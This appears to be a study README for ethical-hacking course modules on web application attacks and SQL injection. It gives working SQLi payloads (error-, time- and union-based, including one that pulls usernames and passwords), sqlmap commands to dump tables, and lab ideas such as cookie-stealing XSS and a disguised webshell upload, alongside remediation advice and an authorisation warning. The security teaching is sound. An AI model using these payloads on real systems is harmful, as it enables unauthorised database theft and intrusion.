# Module 14 & 15 — Web Application Hacking & SQL Injection 🕸️🛡️

> **Course:** CEHv13 / Web App Security Series
> **Modules:** 14 — Web Application Hacking, 15 — SQL Injection

---

## 🎯 Overview

This README covers two paired modules focused on attacking and defending web applications. Module 14 introduces web application attack techniques (OWASP Top 10 mindset, authentication, sessions, business logic flaws, file upload, XSS, CSRF, etc.). Module 15 dives deep into **SQL Injection (SQLi)** — theory, detection, exploitation, and remediation.

This document is intended as a lab/readme for study, practical exercises, and for inclusion in your CEH/pen-testing repo.

---

## ✅ Learning Objectives

* Understand the OWASP Top 10 web vulnerabilities and how they are exploited.
* Perform common web app recon and map functionality to attack surface.
* Identify and exploit authentication, session, and logic flaws.
* Learn XSS (reflected/stored/DOM) and CSRF basics and exploitation techniques.
* Deeply understand SQL Injection: types, payloads, automated exploitation, and manual exploitation techniques (error-, union-, boolean- & time-based).
* Produce concise test reports with reproduction steps and remediation guidance.

---

## 🔧 Prerequisites

* Basic Linux command line knowledge
* Familiarity with HTTP, HTML, and basics of databases (SQL)
* Tools: Burp Suite (Community/Pro), sqlmap, curl, nmap, wfuzz/ffuf, browser devtools

---

## 🧰 Common Tools

* **Burp Suite** — proxy, repeater, intruder, scanner
* **sqlmap** — automated SQLi discovery & exploitation
* **curl / httpie** — quick HTTP requests
* **ffuf / wfuzz** — directory & parameter fuzzing
* **OWASP ZAP** — alternative proxy/scanner
* **Browser devtools** — DOM & network inspection

---

# Module 14 — Web Application Hacking

## 📚 Topics Covered

* OWASP Top 10 (A1–A10) mapping and examples
* Reconnaissance: URL discovery, parameter identification, content enumeration
* Authentication & access control bypasses (IDOR, forced browsing)
* Session management weaknesses (session fixation, predictable IDs)
* Cross-Site Scripting (Reflected, Stored, DOM)
* Cross-Site Request Forgery (CSRF)
* Insecure file upload & RCE vectors
* Business logic & race conditions

## 🧪 Labs & Exercises (suggested)

1. **Recon Lab**: Use ffuf to enumerate directories and parameters; capture in Burp.
2. **Auth Bypass Lab**: Test login forms for SQLi, weak credentials, account enumeration.
3. **XSS Lab**: Find a reflected XSS and create a PoC payload to steal session cookie (use `document.cookie`).
4. **File Upload Lab**: Upload a webshell disguised as PNG (test server-side validation).

## 🔎 Quick Recon Commands

* Directory fuzzing: `ffuf -u https://target/FUZZ -w wordlist.txt -mc 200,301,302`
* Parameter discovery via Burp intruder or Burp's Scanner

---

# Module 15 — SQL Injection (SQLi)

## 🧩 SQL Injection — Quick Primer

SQL Injection occurs when user input is unsafely concatenated into SQL queries. Types include:

* **Error-based SQLi** — rely on DB error messages to extract data
* **Union-based SQLi** — use `UNION SELECT` to append attacker-controlled result sets
* **Boolean-based blind SQLi** — infer data through boolean responses
* **Time-based blind SQLi** — infer data using `SLEEP()` / `WAITFOR` delays

## 🔬 Detection Techniques

* Manual testing: inject single quote `'` or `"` and look for errors/behavior changes
* Time tests: `1' AND SLEEP(5)-- -` and observe response delay
* Error observation: cause a type or syntax error to read DB errors (if verbose)
* Burp Intruder / Repeater for automated payload trials

## ⚙️ Common Payloads (examples)

> **Note:** Use payloads only in authorised lab/test environments.

* Basic test: `' OR '1'='1`
* Error-based: `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -`
* Time-based: `' OR IF(SUBSTR((SELECT database()),1,1)='a', SLEEP(5), 0)-- -`
* Union-based: `' UNION SELECT null,username,password FROM users -- `

## 🛠️ sqlmap Examples

* Basic discovery: `sqlmap -u "https://target/page.php?id=1" --level=2 --risk=1 --batch`
* DB enumeration: `sqlmap -u "https://target/page.php?id=1" --dbs`
* Dump table: `sqlmap -u "https://target/page.php?id=1" -D target_db -T users --dump`
* Usetamper/payload tuning: `--tamper=space2comment,between` (careful — tamper scripts depend on target)

## 🧠 Manual Exploitation Tips

* Determine number of columns: `ORDER BY n` or `UNION SELECT` with incremental nulls
* Find injectable columns: `UNION SELECT null, null, 'qwerty' -- `
* Use `information_schema` to discover table names & columns
* For blind SQLi, automate with `sqlmap --technique=BEUST --batch --risk=3` (B=Boolean, E=Error, U=Union, S=Stacked, T=Time)

---

## 📝 Reporting Checklist (When you find a vuln)

* Vulnerability title (e.g., SQL Injection — Error-based on `page.php?id`)
* Affected URL & parameter
* Request & exact payload used (copy raw HTTP request)
* Vulnerability type and impact (data exposure, RCE potential)
* Proof-of-Concept (screenshots, extracted data snippets)
* Remediation recommendations (use parameterized queries, ORM, input validation, least privilege)

---

## 🛡️ Remediation Guidance (high level)

* Use parameterized queries / prepared statements
* Employ least-privilege DB accounts (no schema/table creation rights for web app user)
* Validate & sanitize inputs; use allowlists for expected formats
* Disable verbose DB error messages in production
* Use web application firewalls (WAF) as temporary mitigation

---

## ⚠️ Safety & Ethics

Only test systems you have explicit authorization to test. Unauthorized testing is illegal and unethical. Use intentionally vulnerable labs (DVWA, bWAPP, WebGoat) or isolated CTF machines for practice.

---

## 📚 Resources & Further Reading

* OWASP Top 10 — [https://owasp.org](https://owasp.org)
* sqlmap project — [https://sqlmap.org](https://sqlmap.org)
* OWASP WebGoat / DVWA / bWAPP — hands-on vulnerable apps

---

## 🗂️ How to use this repo / files

* Place module PDFs in `module-14-webapp/` and `module-15-sqli/` folders alongside the README.
* Add lab instructions & VM snapshots in `labs/` folder for reproducibility.

---

## 📝 License

This content is for educational use. Include your chosen license file (e.g., MIT) in the repo if you plan to share publicly.

---

Made with ❤️ — happy hacking (ethically)!

